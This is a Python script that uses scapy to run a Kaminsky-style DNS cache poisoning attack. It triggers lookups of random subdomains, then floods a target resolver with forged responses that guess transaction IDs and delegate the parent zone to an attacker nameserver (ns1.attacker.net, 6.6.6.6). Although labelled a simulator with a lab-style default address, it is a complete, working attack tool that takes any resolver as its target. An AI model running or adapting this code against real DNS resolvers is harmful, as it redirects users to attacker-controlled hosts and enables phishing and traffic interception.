import argparse
import threading
import time

from scapy.all import DNS, DNSQR, DNSRR, IP, UDP, send

from attack_utils import (
    discover_query_context,
    extract_parent_domain,
    fqdn,
    random_subdomain,
    resolve_authoritative_server_ip,
    trigger_resolver_query,
)


def craft_spoofed_response(
    resolver_ip: str,
    resolver_port: int,
    auth_server_ip: str,
    query_name: str,
    spoofed_ip: str,
    txid: int,
    delegated_domain: str | None = None,
    delegated_ns: str = "ns1.attacker.net",
    delegated_ns_ip: str = "6.6.6.6",
    ttl: int = 300,
):
    query_fqdn = fqdn(query_name)
    delegated_zone = fqdn(delegated_domain or extract_parent_domain(query_name))
    delegated_ns_fqdn = fqdn(delegated_ns)

    answer = DNSRR(rrname=query_fqdn, type="A", ttl=ttl, rdata=spoofed_ip)
    authority = DNSRR(rrname=delegated_zone, type="NS", ttl=ttl, rdata=delegated_ns_fqdn)
    additional = DNSRR(rrname=delegated_ns_fqdn, type="A", ttl=ttl, rdata=delegated_ns_ip)

    dns = DNS(
        id=txid,
        qr=1,
        aa=1,
        rd=0,
        ra=0,
        qdcount=1,
        ancount=1,
        nscount=1,
        arcount=1,
        qd=DNSQR(qname=query_fqdn, qtype="A"),
        an=answer,
        ns=authority,
        ar=additional,
    )
    return IP(src=auth_server_ip, dst=resolver_ip) / UDP(sport=53, dport=resolver_port) / dns


def send_spoof_flood(
    *,
    resolver_ip: str,
    resolver_port: int,
    auth_server_ip: str,
    query_name: str,
    spoofed_ip: str,
    txid_start: int,
    txid_count: int,
    delegated_domain: str | None,
    delegated_ns: str,
    delegated_ns_ip: str,
    ttl: int,
    inter_packet_delay: float,
) -> int:
    packets = [
        craft_spoofed_response(
            resolver_ip=resolver_ip,
            resolver_port=resolver_port,
            auth_server_ip=auth_server_ip,
            query_name=query_name,
            spoofed_ip=spoofed_ip,
            txid=txid,
            delegated_domain=delegated_domain,
            delegated_ns=delegated_ns,
            delegated_ns_ip=delegated_ns_ip,
            ttl=ttl,
        )
        for txid in range(txid_start, txid_start + txid_count)
    ]
    send(packets, verbose=False, inter=inter_packet_delay)
    return len(packets)


def run_attack(args: argparse.Namespace) -> None:
    auth_server_ip = args.auth_server_ip
    resolver_port = args.resolver_port

    if args.discover:
        probe_name = random_subdomain(args.target_domain)
        context = discover_query_context(
            probe_name,
            resolver_ip=args.resolver_ip,
            iface=args.iface,
            timeout=args.discovery_timeout,
        )
        auth_server_ip = auth_server_ip or context["auth_server_ip"]
        resolver_port = resolver_port or context["resolver_port"]
        print(
            "discovered upstream context:",
            f"auth_server_ip={auth_server_ip}",
            f"resolver_port={resolver_port}",
            f"probe_qname={probe_name}",
            flush=True,
        )
    else:
        if auth_server_ip is None:
            context = resolve_authoritative_server_ip(
                args.target_domain,
                bootstrap_resolver=args.bootstrap_resolver,
            )
            auth_server_ip = context["auth_server_ip"]
            print(
                "resolved authoritative server:",
                f"zone={context['zone']}",
                f"ns_name={context['ns_name']}",
                f"auth_server_ip={auth_server_ip}",
                flush=True,
            )
        if resolver_port is None:
            resolver_port = args.default_resolver_port
            print(
                "using assumed resolver source port:",
                f"resolver_port={resolver_port}",
                flush=True,
            )

    for attempt in range(args.attempts):
        query_name = random_subdomain(args.target_domain)
        worker = threading.Thread(
            target=trigger_resolver_query,
            args=(query_name, args.resolver_ip, args.query_timeout),
            daemon=True,
        )
        worker.start()
        time.sleep(args.pre_flood_delay)

        packet_count = send_spoof_flood(
            resolver_ip=args.resolver_ip,
            resolver_port=resolver_port,
            auth_server_ip=auth_server_ip,
            query_name=query_name,
            spoofed_ip=args.spoofed_ip,
            txid_start=args.txid_start,
            txid_count=args.txid_count,
            delegated_domain=args.delegated_domain,
            delegated_ns=args.delegated_ns,
            delegated_ns_ip=args.delegated_ns_ip,
            ttl=args.ttl,
            inter_packet_delay=args.inter_packet_delay,
        )
        worker.join(timeout=args.query_timeout + 0.2)
        print(
            f"[attempt {attempt + 1}/{args.attempts}] qname={query_name} "
            f"flooded_packets={packet_count} auth_server_ip={auth_server_ip} "
            f"resolver_port={resolver_port}",
            flush=True,
        )
        if args.inter_attempt_delay:
            time.sleep(args.inter_attempt_delay)


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description="Kaminsky-style flood simulator")
    parser.add_argument("--resolver-ip", default="172.28.0.10")
    parser.add_argument("--resolver-port", type=int, default=None)
    parser.add_argument("--default-resolver-port", type=int, default=5300)
    parser.add_argument("--auth-server-ip", default=None)
    parser.add_argument("--bootstrap-resolver", default=None)
    parser.add_argument("--target-domain", required=True)
    parser.add_argument("--spoofed-ip", default="6.6.6.6")
    parser.add_argument("--delegated-domain", default=None)
    parser.add_argument("--delegated-ns", default="ns1.attacker.net")
    parser.add_argument("--delegated-ns-ip", default="6.6.6.6")
    parser.add_argument("--attempts", type=int, default=10)
    parser.add_argument("--txid-start", type=int, default=0)
    parser.add_argument("--txid-count", type=int, default=1000)
    parser.add_argument("--ttl", type=int, default=300)
    parser.add_argument("--query-timeout", type=float, default=1.0)
    parser.add_argument("--pre-flood-delay", type=float, default=0.02)
    parser.add_argument("--inter-packet-delay", type=float, default=0.0)
    parser.add_argument("--inter-attempt-delay", type=float, default=0.1)
    parser.add_argument("--iface", default=None)
    parser.add_argument("--discovery-timeout", type=float, default=3.0)
    parser.add_argument("--discover", action="store_true")
    return parser


if __name__ == "__main__":
    run_attack(build_parser().parse_args())
